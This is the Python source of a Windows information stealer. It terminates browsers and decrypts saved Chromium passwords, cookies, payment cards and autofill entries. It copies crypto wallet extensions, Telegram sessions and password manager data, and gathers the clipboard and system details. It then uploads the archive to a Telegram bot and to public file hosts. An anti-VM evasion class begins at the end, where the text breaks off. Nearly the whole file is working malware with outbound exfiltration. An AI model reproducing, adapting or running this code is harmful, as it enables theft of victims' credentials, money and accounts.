import ctypes
import json
import asyncio
import base64
import sys
import aiohttp # type: ignore
import os
import shutil
import sqlite3
import requests
import platform
import psutil # type: ignore
import win32api # type: ignore

from pathlib import Path
from ctypes import *
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore


TOKEN = '%token%'
CHAT_ID = '%chatid%'


def error_handler(error_message: str) -> None:
    hostname = platform.node()
    temp_dir = os.path.join(os.getenv('TEMP'), hostname)

    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    exc_message = error_message
    error_file_path = os.path.join(temp_dir, 'errors.txt')

    with open(error_file_path, 'a') as file:
        file.write(f"Message : {exc_message}\n\n")
        
class ListFonction:
    Cards = list()
    Cookies = list()
    Passwords = list()
    Autofills = list()

    ClipBoard = list()
    Network = list()
    InstalledSoftware = list()
    Processes = list()
    TasksList = list()
    SystemInfo = list()

    PasswordManager = list()
    WalletsCounts = list()

class WindowsApi:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
            jsonContent: dict = json.load(file)

            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

            return WindowsApi.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(WindowsApi.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"

class get_data:
    def __init__(self):
        self.profiles_full_path = []
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv('TEMP')

    async def RunAllFonctions(self):
        await self.kill_browsers()
        await self.list_profiles()
        taskk = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetAutoFills()),
            InfoStealer().run_all_fonctions(),
            ]
        await asyncio.gather(*taskk)
        await self.InsideFolder()
        await self.SendAllData()
    async def list_profiles(self) -> None:
        try:
            directorys = {
                "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
                "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
                "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
                "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
            }
            for name, directory in directorys.items():
                if os.path.isdir(directory):
                    if "Opera" in name:
                        self.profiles_full_path.append(directory)
                    else:
                        self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)

        except Exception as e:
            error_handler(f"list profiles error - {str(e)}")
            pass

    async def kill_browsers(self):
        try:
            process_names = ["chrome.exe", "opera.exe", "edge.exe", "brave.exe", "browser.exe", "vivaldi.exe", "iridium.exe", "epicprivacy.exe", "chromium.exe"]
            process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)

            stdout, stderr = await process.communicate()
            if not process.returncode != 0:
                output_lines = stdout.decode(errors="ignore").split('\n')
                for line in output_lines:
                    for process_name in process_names:
                        if process_name.lower() in line.lower():
                            parts = line.split()
                            pid = parts[1]
                            process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                            await process.communicate()
        except Exception as e:
            error_handler(f"kill browser error - {str(e)}")
            pass

    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                shutil.copyfile(LoginData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for login in logins:
                    if login[0] and login[1] and login[2]:
                        ListFonction.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {WindowsApi.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
        except Exception as e:
            error_handler(f"get password error - {str(e)}")
            pass
    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                shutil.copyfile(WebData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                cards = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for card in cards:
                    if card[2] < 10:
                        month = "0" + str(card[2])
                    else:month = card[2]
                    ListFonction.Cards.append(f"{WindowsApi.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
        except Exception as e:
            error_handler(f"get card error - {str(e)}")
            pass 
    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")

                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]

                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
            
                try:
                    shutil.copyfile(CookieData, copied_file_path)
                except:
                    pass

                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
                cookies = cursor.fetchall()
             
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:
                    pass

                for cookie in cookies:
                    dec_cookie = WindowsApi.Decrpytion(cookie[3], key)
                    ListFonction.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
                    
        except Exception as e:
            error_handler(f"get cookies error - {str(e)}")
            pass

    async def GetAutoFills(self) -> None:
        try:
            for path in self.profiles_full_path:
                autofill_data = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")                
                shutil.copyfile(autofill_data, copied_file_path)
                with sqlite3.connect(copied_file_path) as database_connection:
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT * FROM autofill')
                    autofills = cursor.fetchall()
                for autofill in autofills:
                    if autofill:
                        ListFonction.Autofills.append(f"data: {autofill[0]}\nvalue: {autofill[1]}\n==============================\n")
                try:
                    cursor.close()
                    os.remove(copied_file_path)
                except:pass  
        except Exception as e:
            error_handler(f"get autofills error - {str(e)}")

    async def StealWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "Binance (Chrome)": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Binance (Edge)": "eeagobfjdenkkddmbclomhiblgggliao",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Ronin (Chrome)": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Coinbase (Chrome)": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "Coinbase (Edge)": "jbdaocneiiinmjbjlgalhcelgbejmnid",
                "MetaMask (Chrome)": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "MetaMask (Edge)": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "TrustWallet (Chrome)": "egjidjbpglichdcondbcbdnbeeppgdph",
                "TrustWallet (Edge)": "fdjamakpfbbddfjaooikfcpapjohcfmg",
                "Ronin (Edge)": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
                "Bytecoin": os.path.join(self.appdata, "bytecoin"),
                "Coinomi": os.path.join(self.localappdata, "Coinomi", "Coinomi", "wallets"),
                "Atomic": os.path.join(self.appdata, "Atomic", "Local Storage", "leveldb"),
                "Dash": os.path.join(self.appdata, "DashCore", "wallets"),
                "Exodus": os.path.join(self.appdata, "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(self.appdata, "Electrum", "wallets"),
                "WalletWasabi": os.path.join(self.appdata, "WalletWasabi", "Client", "Wallets"),
            }
            wallet_dir = os.path.join(copied_path, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)

            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                dest_path = os.path.join(wallet_dir, file_name)
                                shutil.copytree(wallet_path, dest_path)
                            except Exception:
                                error_handler(f"wallet extension error - {str(e)}")


            for wallet_name, wallet_path in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                except Exception as e:
                    error_handler(f"wallet dekstop error - {str(e)}")

        except Exception as e:
            error_handler(f"wallets error - {str(e)}")

    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
            
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]

                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate()

                if not os.path.exists(copy_path):
                    os.makedirs(copy_path)

                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dirs))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dirs))
                    except Exception as e:
                        error_handler(f"copy telegram folders error - {str(e)}")
                        continue

                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)

        except Exception as e:
            error_handler(f"telegram error - {str(e)}")
            pass

    async def StealPasswordManagers(self, directory_path: str) -> None:
        try:
            browser_paths = {
                "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
                "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
                "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
                "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
            }

            password_mgr_dirs = {
                "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
                "eiaeiblijfjekdanodkjadfinkhbfgcd": "NordPass",
                "fdjamakpfbbddfjaooikfcpapjohcfmg": "DashLane",
                "nngceckbapebfimnlniiiahkandclblb": "Bitwarden",
                "pnlccmojcmeohlpggmfnbbiapkmbliob": "RoboForm",
                "bfogiafebfohielmmehodmfbbebbbpei": "Keeper",
                "cnlhokffphohmfcddnibpohmkdfafdli": "MultiPassword",
                "oboonakemofpalcgghocfoadofidjkkk": "KeePassXC",
                "hdokiejnpimakedhajhdlcegeplioahd": "LastPass",
                "imloifkgjagghnncjkhggdhalmcnfklk": "Trezor",
            }

            for browser_name, browser_path in browser_paths.items():
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        if "Local Extension Settings" in dirs:
                            local_extensions_settings_dir = os.path.join(root, "Local Extension Settings")
                            for password_mgr_key, password_manager in password_mgr_dirs.items():
                                extension_path = os.path.join(local_extensions_settings_dir, password_mgr_key)
                                if os.path.exists(extension_path):
                                    password_mgr_browser = f"{password_manager} ({browser_name})"
                                    password_dir_path = os.path.join(directory_path, "Password Managers", password_mgr_browser)
                                    os.makedirs(password_dir_path, exist_ok=True)
                                    if Path(extension_path).is_dir():
                                        shutil.copytree(Path(extension_path), password_dir_path, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(Path(extension_path), password_dir_path)
                                    location_file = os.path.join(password_dir_path, "Location.txt")
                                    with open(location_file, 'w') as loc_file:
                                        loc_file.write(f"Copied {password_manager} from {extension_path} to {password_dir_path}")
            if len(os.listdir(password_dir_path)) == 0:
                os.rmdir(password_dir_path)
        except Exception as e:
            error_handler(f"password manager error - {str(e)}")
        
    async def InsideFolder(self) -> None:
        try:
            hostname = platform.node()
            filePath = os.path.join(self.temp, hostname)

            if os.path.isdir(filePath):
                shutil.rmtree(filePath)

            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Computer"))
            os.mkdir(os.path.join(filePath, "Browsers"))
          
            if ListFonction.SystemInfo:
                with open(os.path.join(filePath, "Computer", "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SystemInfo:
                        file.write(value)
            if ListFonction.ClipBoard:
                with open(os.path.join(filePath, "Computer", "clipboard_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.ClipBoard:
                        file.write(value)
            if ListFonction.InstalledSoftware:
                with open(os.path.join(filePath, "Computer", "softwares_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.InstalledSoftware:
                        file.write(value)
            if ListFonction.TasksList:
                with open(os.path.join(filePath, "Computer", "tasklist_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TasksList:
                        file.write(value)
            if ListFonction.Network:
                with open(os.path.join(filePath, "Computer", "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Network:
                        file.write(value)
            if ListFonction.Processes:
                with open(os.path.join(filePath, "Computer", "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Processes:
                        file.write(value)

            if ListFonction.Passwords:
                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for passwords in ListFonction.Passwords:
                        file.write(passwords)
            if ListFonction.Cards:
                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for cards in ListFonction.Cards:
                        file.write(cards)
            if ListFonction.Cookies:
                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for cookies in ListFonction.Cookies:
                        file.write(cookies)
            if ListFonction.Autofills:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for autofill in ListFonction.Autofills:
                        file.write(autofill)

            if len(os.listdir(os.path.join(filePath, "Computer"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Computer"))
                except:pass
            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Browsers"))
                except:pass

            tasks = [
                self.StealWallets(filePath),
                self.StealTelegramSession(filePath),
                self.StealPasswordManagers(filePath),
            ]
            await asyncio.gather(*tasks)
            count_folders_in = {
                "Wallets": len(os.listdir(os.path.join(filePath, "Wallets"))),
                "PasswordManager": len(os.listdir(os.path.join(filePath, "PasswordManager"))),
            }
            ListFonction.WalletsCounts.append(str(count_folders_in["Wallets"]))
            ListFonction.PasswordManager.append(str(count_folders_in["PasswordManager"]))
            folders_to_check = ["Wallets", "Password Managers"]
            
            for folder in folders_to_check:
                try:
                    if len(os.listdir(os.path.join(filePath, folder))) == 0:
                        shutil.rmtree(os.path.join(filePath, folder))
                except Exception as e:
                    error_handler(f"remove empty folder error - {str(e)}")


        except Exception as e:
            error_handler(f"insidefolder error - {str(e)}")

    async def SendKeyWords(self) -> None:
        try:
            cookies = []
            passwords = []
            autofills = []
            
            words = ["keyword_example.com", "another_example.net"] 

            for word in words:
                found_autofill = any(word in autofill for autofill in ListFonction.Autofills)
                found_password = any(word in password for password in ListFonction.Passwords)
                found_cookie = any(word in cookie for cookie in ListFonction.Cookies)
                
                if found_cookie: 
                    cookies.append(word)
                if found_password: 
                    passwords.append(word)
                if found_autofill: 
                    autofills.append(word)

            text = f"<b>📚 <i><u>{platform.node()} - Keywords Results</u></i></b>\n\n"

            if cookies: 
                text += f"<b>Cookies:</b>\n<code>{', '.join(cookies if cookies else None)}</code>\n"
            if passwords: 
                text += f"<b>Passwords:</b>\n<code>{', '.join(passwords if passwords else None)}</code>\n"
            if autofills: 
                text += f"<b>Autofills:</b>\n<code>{', '.join(autofills if autofills else None)}</code>\n"

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    pass
        except Exception as e:
            error_handler(f"send keywords error - {str(e)}")

    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)
            system_info = platform.uname()

            data = requests.get("https://ipinfo.io/json").json()

            ipaddress = data.get("ip")
            region = data.get("region")
            country = data.get("country")
            location = data.get("loc", "").split(",")

            text = f"""
<b>👤  <i><u>{hostname} - All Info</u></i></b>

<b><i><u>System Info</u></i></b>

<b>Computer Host:</b> <code>{system_info.node}</code>
<b>Computer OS:</b> <code>{system_info.system} {system_info.release} {system_info.version}</code>
<b>Total Memory:</b> <code>{system_info.machine}</code>
<b>CPU:</b> <code>{system_info.processor}</code>

<b><i><u>IP Info</u></i></b>
<b>IP Address:</b> <code>{ipaddress}</code>
<b>Region:</b> <code>{region}</code>
<b>Country:</b> <code>{country}</code>

<b><i><u>Browser</u></i></b>
<b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
<b>Passwords:</b> <code>{str(len(ListFonction.Passwords))}</code>
<b>Cookies:</b> <code>{str(len(ListFonction.Cookies))}</code>
<b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>

<b><i><u>Other</u></i></b>
<b>Wallets:</b> <code>{str(len(ListFonction.WalletsCounts))}</code>
<b>Password Manager:</b> <code>{str(len(ListFonction.PasswordManager))}</code>
"""

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to send message: {await response.text()}")

                if os.path.getsize(filePath + ".zip") / (1024 * 1024) <= 15:
                    send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                    async with aiohttp.ClientSession() as session:
                        with open(filePath + ".zip", 'rb') as file:
                            document_payload = {
                                'chat_id': CHAT_ID,
                            }
                            files = {
                                'document': file
                            }
                            async with session.post(send_document_url, data=document_payload, files=files) as response:
                                if response.status != 200:
                                    error_handler(f"Error sending file: {await response.text()}")
                else:
                    file_url = await UploadFiles.upload_file(filePath + ".zip")
                    if file_url is not None:
                        text = f"<b>{platform.node()} - File Link</b>\n\n<b>{file_url}</b>"
                        message_payload['text'] = text
                        async with aiohttp.ClientSession() as session:
                            async with session.post(send, data=message_payload) as response:
                                if response.status != 200:
                                    raise Exception(f"Failed to send file link: {await response.text()}")
                    else:
                        text = "<b>Can't Send File With GoFile</b>"
                        message_payload['text'] = text
                        async with aiohttp.ClientSession() as session:
                            async with session.post(send, data=message_payload) as response:
                                if response.status != 200:
                                    raise Exception(f"Failed to send error message: {await response.text()}")

                try:
                    os.remove(filePath + ".zip")
                    shutil.rmtree(filePath)
                except Exception as e:
                    error_handler(f"Failed to remove files: {str(e)}")

        except Exception as e:
            error_handler(f"SendAllData error: {str(e)}")
        

class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as e:
            error_handler(f"gofile server error - {str(e)}")
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        if response.status == 200 and "data" in data:
                            return data["data"]["downloadPage"]
                        else:
                            return None
        except Exception as e:
            error_handler(f"gofile error - {str(e)}")
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')
                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        if "catbox.moe" in result:
                            return result
                        else:
                            return None
        except Exception as e:
            error_handler(f"catbox error - {str(e)}")
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            return None
        except Exception as e:
            error_handler(f"fileio error - {str(e)}")
            return None

    @staticmethod
    async def upload_uguu(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                        data = await response.json()
                        if "url" in data:
                            return data.get("url")
                        else:
                            return None
        except Exception as e:
            error_handler(f"uguu error - {str(e)}")
            return None

    @staticmethod
    async def upload_krakenfiles(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://krakenfiles.com/api/v1/file/upload', data=form) as response:
                        data = await response.json()
                        if "data" in data and "file" in data["data"]:
                            return data["data"]["file"]["url"]
                        else:
                            return None
        except Exception as e:
            error_handler(f"krakenfiles error - {str(e)}")
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('GoFile', UploadFiles.upload_gofile),
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
            ('Uguu', UploadFiles.upload_uguu),
            ('KrakenFiles', UploadFiles.upload_krakenfiles),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception as e:
                error_handler(f"{platform} upload attempt error - {str(e)}")
                continue
        
        return "All upload attempts failed."

class InfoStealer:
    def __init__(self):
        self.loop = asyncio.get_event_loop()

    async def run_all_fonctions(self):
        await asyncio.gather(
            self.StealLastClipBoard(),
            self.StealNetworkInformation(),
            self.StealInstalledSoftware(),
            self.StealProcesses(),
            self.StealTasks(),
            self.StealSystemInfo()
        )
    
    async def get_command_output(self, command: str) -> str:
        process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
        stdout, stderr = await process.communicate()
        if stderr:
            error_handler(f"get command error")
        return stdout.decode(errors="ignore")

    async def StealLastClipBoard(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Clipboard")
            if output:
                ListFonction.ClipBoard.append(output)
        except Exception as e:
            error_handler(f"clipboard error - {str(e)}")

    async def StealNetworkInformation(self) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data["query"]
                    country = data["country"]
                    city = data["city"]
                    timezone = data["timezone"]
                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
                    ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
        except Exception as e:
            error_handler(f"network error - {str(e)}")

    async def StealInstalledSoftware(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version | ConvertTo-Json")
            software_list = json.loads(output)
            ListFonction.InstalledSoftware.extend([f"Name: {software['Name']}, Version: {software['Version']}" for software in software_list])
        except Exception as e:
            error_handler(f"installed softwares error - {str(e)}")

    async def StealProcesses(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Process | Select-Object -Property Name, Id | ConvertTo-Json")
            processes_list = json.loads(output)
            ListFonction.Processes.extend([f"Name: {process['Name']}, Id: {process['Id']}" for process in processes_list])
        except Exception as e:
            error_handler(f"processes error - {str(e)}")

    async def StealTasks(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-ScheduledTask | Select-Object -Property TaskName | ConvertTo-Json")
            tasks_list = json.loads(output)
            ListFonction.TasksList.extend([f"TaskName: {task['TaskName']}" for task in tasks_list])
        except Exception as e:
            error_handler(f"tasks error - {str(e)}")

    async def StealSystemInfo(self) -> None:
        try:
            command = r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername'
            output = await self.get_command_output(command)
            ListFonction.SystemInfo.append(output)
        except Exception as e:
            error_handler(f"system infos error - {str(e)}")
            pass

class anti_vm:
    async def run_all_fonctions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception as e:
            error_handler(f"send all anti vm error - {str(e)}")

    async def check_disk_space(self) -> bool:
        try:
